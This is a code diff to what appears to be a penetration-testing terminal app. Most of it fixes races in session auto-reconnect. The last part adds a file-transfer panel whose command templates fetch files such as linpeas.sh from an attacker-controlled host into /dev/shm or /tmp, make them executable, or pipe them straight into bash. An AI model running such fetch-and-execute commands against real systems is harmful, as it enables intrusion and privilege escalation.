@@ -1237,6 +1237,8 @@ export function App({
   const [sidebarTransferLhost, setSidebarTransferLhost] = useState<string>('10.10.14.1');
   const [sidebarTransferLocalIPs, setSidebarTransferLocalIPs] = useState<NetworkInterfaceIP[]>([]);
   const [sidebarTransferTargetOs, setSidebarTransferTargetOs] = useState<'linux' | 'windows'>('linux');
+  const [sidebarTransferTool, setSidebarTransferTool] = useState<'curl' | 'wget' | 'memory'>('curl');
+  const [sidebarTransferDestDir, setSidebarTransferDestDir] = useState<string>('.');
   const [sidebarTransferCmdSet, setSidebarTransferCmdSet] = useState<FileTransferCommandSet | null>(null);
   const [sidebarTransferExtCmd, setSidebarTransferExtCmd] = useState<string>('');
   const [sidebarTransferBusy, setSidebarTransferBusy] = useState<boolean>(false);
@@ -1409,6 +1411,7 @@ export function App({
         port: Number(sidebarTransferPort) || 8000,
         useTLS: false,
         targetOs: sidebarTransferTargetOs,
+        targetDestDir: sidebarTransferDestDir,
         enableUpload: sidebarTransferUpload,
         sha256: matchedHash?.sha256,
         md5: matchedHash?.md5,
@@ -1424,6 +1427,7 @@ export function App({
     sidebarTransferLhost,
     sidebarTransferPort,
     sidebarTransferTargetOs,
+    sidebarTransferDestDir,
     sidebarTransferUpload,
   ]);
 
@@ -1805,10 +1809,13 @@ export function App({
   }, [tabs]);
 
   const [reconnectStates, setReconnectStates] = useState<Map<string, ReconnectState>>(new Map());
+  const reconnectStatesRef = useRef<Map<string, ReconnectState>>(new Map());
+  const reconnectInFlightRef = useRef<Set<string>>(new Set());
   const reconnectTimersRef = useRef<Map<string, ReturnType<typeof setInterval>>>(new Map());
   const intentionalDisconnectsRef = useRef<Set<string>>(new Set());
   const saveWorkspaceTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const startAutoReconnectRef = useRef<((pane: PaneItem, tabId: string, attempt?: number, reason?: string) => void) | null>(null);
+  const performReconnectRef = useRef<((paneId: string) => Promise<void>) | null>(null);
   const [statusMessage, setStatusMessage] = useState<string>(
     initialLocked
       ? 'Vault is locked (Dark Crimson Theme). Unlock your vault to switch to Teal and access saved hosts.'
@@ -5807,10 +5814,12 @@ export function App({
       clearInterval(timer);
       reconnectTimersRef.current.delete(paneId);
     }
-    const recState = reconnectStates.get(paneId);
+    const recState = reconnectStatesRef.current.get(paneId) || reconnectStates.get(paneId);
+    reconnectInFlightRef.current.delete(paneId);
     setReconnectStates((prev) => {
       const next = new Map(prev);
       next.delete(paneId);
+      reconnectStatesRef.current = next;
       return next;
     });
     if (recState && shouldClosePane) {
@@ -5820,24 +5829,39 @@ export function App({
   };
 
   const performReconnect = async (paneId: string): Promise<void> => {
+    // Prevent duplicate parallel reconnect attempts (e.g. double-clicking Reconnect Now).
+    if (reconnectInFlightRef.current.has(paneId)) {
+      return;
+    }
     const timer = reconnectTimersRef.current.get(paneId);
     if (timer) {
       clearInterval(timer);
       reconnectTimersRef.current.delete(paneId);
     }
-    const recState = reconnectStates.get(paneId);
+    const recState = reconnectStatesRef.current.get(paneId);
     if (!recState) return;
 
+    reconnectInFlightRef.current.add(paneId);
     const currentAttempt = recState.status === 'failed' ? 1 : recState.attempt;
+    const activeState: ReconnectState = {
+      ...recState,
+      attempt: currentAttempt,
+      status: 'reconnecting',
+      countdown: 0,
+    };
     setReconnectStates((prev) => {
       const next = new Map(prev);
-      next.set(paneId, { ...recState, attempt: currentAttempt, status: 'reconnecting', countdown: 0 });
+      next.set(paneId, activeState);
+      reconnectStatesRef.current = next;
       return next;
     });
 
     setStatusMessage(`Attempting to reconnect ${recState.title} (Attempt ${currentAttempt}/${recState.maxAttempts})...`);
     const api = getWailsBindings();
-    if (!api) return;
+    if (!api) {
+      reconnectInFlightRef.current.delete(paneId);
+      return;
+    }
 
     try {
       let newSessionId = '';
@@ -5847,6 +5871,13 @@ export function App({
         throw new Error('Host ID not available for auto-reconnect');
       }
 
+      // If the user cancelled while the handshake was in flight, close the orphaned session.
+      if (!reconnectStatesRef.current.has(paneId)) {
+        void api.DisconnectSession?.(newSessionId);
+        return;
+      }
+
+      setLiveSessions((prev) => new Set(prev).add(newSessionId));
       setTabs((prev) =>
         prev.map((t) => {
           if (t.id !== recState.tabId) return t;
@@ -5866,15 +5897,20 @@ export function App({
       setReconnectStates((prev) => {
         const next = new Map(prev);
         next.delete(paneId);
+        reconnectStatesRef.current = next;
         return next;
       });
 
       setStatusMessage(`Successfully reconnected to ${recState.title}!`);
     } catch (err) {
+      if (!reconnectStatesRef.current.has(paneId)) {
+        return;
+      }
       const errMsg = err instanceof Error ? err.message : String(err);
       const nextAttempt = currentAttempt + 1;
       if (nextAttempt <= recState.maxAttempts) {
-        startAutoReconnect(
+        reconnectInFlightRef.current.delete(paneId);
+        startAutoReconnectRef.current?.(
           {
             id: paneId,
             sessionId: '',
@@ -5885,6 +5921,7 @@ export function App({
           nextAttempt,
           errMsg
         );
+        return;
       } else {
         setReconnectStates((prev) => {
           const next = new Map(prev);
@@ -5895,12 +5932,16 @@ export function App({
             countdown: 0,
             reason: errMsg || 'Maximum reconnect attempts exceeded',
           });
+          reconnectStatesRef.current = next;
           return next;
         });
         setStatusMessage(`Auto-reconnect to ${recState.title} failed after ${recState.maxAttempts} attempts.`);
       }
+    } finally {
+      reconnectInFlightRef.current.delete(paneId);
     }
   };
+  performReconnectRef.current = performReconnect;
 
   const startAutoReconnect = (
     pane: PaneItem,
@@ -5914,28 +5955,29 @@ export function App({
       reconnectTimersRef.current.delete(pane.id);
     }
 
-    const maxAttempts = globalSettings.maxReconnectAttempts || 5;
+    const maxAttempts = globalSettingsRef.current.maxReconnectAttempts || 5;
     const effectiveAttempt = Math.max(1, attempt);
     const delaySec = attempt === 0 ? 0 : Math.min(Math.pow(2, effectiveAttempt), 30);
 
-    setReconnectStates((prev) => {
-      const next = new Map(prev);
-      next.set(pane.id, {
-        paneId: pane.id,
-        tabId,
-        hostId: pane.hostId,
-        title: pane.title,
-        attempt: effectiveAttempt,
-        maxAttempts,
-        countdown: delaySec,
-        status: 'reconnecting',
-        reason: reason || 'Connection dropped',
-      });
-      return next;
-    });
+    const nextState: ReconnectState = {
+      paneId: pane.id,
+      tabId,
+      hostId: pane.hostId,
+      title: pane.title,
+      attempt: effectiveAttempt,
+      maxAttempts,
+      countdown: delaySec,
+      status: 'reconnecting',
+      reason: reason || 'Connection dropped',
+    };
+
+    const syncMap = new Map(reconnectStatesRef.current);
+    syncMap.set(pane.id, nextState);
+    reconnectStatesRef.current = syncMap;
+    setReconnectStates(syncMap);
 
     if (delaySec === 0) {
-      void performReconnect(pane.id);
+      void performReconnectRef.current?.(pane.id);
       return;
     }
 
@@ -5948,12 +5990,13 @@ export function App({
           if (!cur) return prev;
           const next = new Map(prev);
           next.set(pane.id, { ...cur, countdown: remaining });
+          reconnectStatesRef.current = next;
           return next;
         });
       } else {
         clearInterval(timer);
         reconnectTimersRef.current.delete(pane.id);
-        void performReconnect(pane.id);
+        void performReconnectRef.current?.(pane.id);
       }
     }, 1000);
 
@@ -8017,6 +8060,7 @@ export function App({
             const rc = reconnectStates.get(node.id);
             if (!rc) return null;
             const isFailed = rc.status === 'failed';
+            const isConnecting = !isFailed && rc.countdown === 0;
             return (
               <div
                 className="pane-reconnect-overlay"
@@ -8034,6 +8078,10 @@ export function App({
                   <p className="reconnect-subtext">
                     {isFailed ? (
                       `Auto-reconnect failed after ${rc.maxAttempts} attempts.`
+                    ) : isConnecting ? (
+                      <>
+                        Reconnecting to <strong>{node.title}</strong>... (Attempt {rc.attempt}/{rc.maxAttempts})
+                      </>
                     ) : (
                       <>
                         Reconnecting to <strong>{node.title}</strong> in{' '}
@@ -8050,12 +8098,13 @@ export function App({
                     <button
                       type="button"
                       className="btn-primary"
+                      disabled={isConnecting}
                       onClick={(e) => {
                         e.stopPropagation();
                         void performReconnect(node.id);
                       }}
                     >
-                      {isFailed ? 'Retry Reconnect' : 'Reconnect Now'}
+                      {isFailed ? 'Retry Reconnect' : isConnecting ? 'Reconnecting...' : 'Reconnect Now'}
                     </button>
                     <button
                       type="button"
@@ -11193,12 +11242,72 @@ export function App({
                       style={{ fontSize: '0.68rem' }}
                     />
 
+                    {sidebarTransferTargetOs === 'linux' && (
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '0.25rem', flexWrap: 'wrap' }}>
+                        <div style={{ display: 'flex', gap: '0.2rem' }} aria-label="Linux Download Tool">
+                          {(
+                            [
+                              { id: 'curl', label: 'curl' },
+                              { id: 'wget', label: 'wget' },
+                              { id: 'memory', label: 'curl | bash' },
+                            ] as const
+                          ).map((tool) => (
+                            <button
+                              key={tool.id}
+                              type="button"
+                              className={`cyber-pill-btn ${sidebarTransferTool === tool.id ? 'active' : ''}`}
+                              style={{ padding: '1px 5px', fontSize: '0.6rem' }}
+                              onClick={() => setSidebarTransferTool(tool.id)}
+                            >
+                              {tool.label}
+                            </button>
+                          ))}
+                        </div>
+                        {sidebarTransferTool !== 'memory' && (
+                          <div style={{ display: 'flex', gap: '0.2rem' }} aria-label="Linux Target Directory">
+                            {(
+                              [
+                                { dir: '.', label: 'Current (.)' },
+                                { dir: '/dev/shm', label: '/dev/shm' },
+                                { dir: '/tmp', label: '/tmp' },
+                              ] as const
+                            ).map((d) => (
+                              <button
+                                key={d.dir}
+                                type="button"
+                                className={`cyber-pill-btn ${sidebarTransferDestDir === d.dir ? 'active' : ''}`}
+                                style={{ padding: '1px 5px', fontSize: '0.6rem' }}
+                                onClick={() => setSidebarTransferDestDir(d.dir)}
+                              >
+                                {d.label}
+                              </button>
+                            ))}
+                          </div>
+                        )}
+                      </div>
+                    )}
+
                     {(() => {
+                      const fname = sidebarTransferSelectedFile || 'linpeas.sh';
+                      const destPrefix = sidebarTransferDestDir === '.' ? '.' : sidebarTransferDestDir;
                       const fallbackCmd =
                         sidebarTransferTargetOs === 'windows'
-                          ? `iwr -Uri http://${sidebarTransferLhost}:${sidebarTransferPort}/${sidebarTransferSelectedFile || 'linpeas.sh'} -OutFile ${sidebarTransferSelectedFile || 'linpeas.sh'}`
-                          : `curl -O http://${sidebarTransferLhost}:${sidebarTransferPort}/${sidebarTransferSelectedFile || 'linpeas.sh'}`;
+                          ? `iwr -Uri http://${sidebarTransferLhost}:${sidebarTransferPort}/${fname} -OutFile .\${fname}`
+                          : sidebarTransferTool === 'wget'
+                            ? `wget -q "http://${sidebarTransferLhost}:${sidebarTransferPort}/${fname}" -O "${destPrefix}/${fname}" && chmod +x "${destPrefix}/${fname}"`
+                            : sidebarTransferTool === 'memory'
+                              ? `curl -fsSL "http://${sidebarTransferLhost}:${sidebarTransferPort}/${fname}" | bash`
+                              : `curl -fsSL "http://${sidebarTransferLhost}:${sidebarTransferPort}/${fname}" -o "${destPrefix}/${fname}" && chmod +x "${destPrefix}/${fname}"`;
+                      const wantedId =
+                        sidebarTransferTargetOs === 'linux'
+                          ? sidebarTransferTool === 'wget'
+                            ? 'linux-wget'
+                            : sidebarTransferTool === 'memory'
+                              ? 'linux-curl-mem'
+                              : 'linux-curl'
+                          : '';
                       const pickedMethod =
+                        (wantedId && sidebarTransferCmdSet?.methods?.find((m) => m.id === wantedId)) ||
                         sidebarTransferCmdSet?.methods?.find((m) => m.category === 'download') ||
                         sidebarTransferCmdSet?.methods?.[0];
                       const cmd = pickedMethod?.command || fallbackCmd;
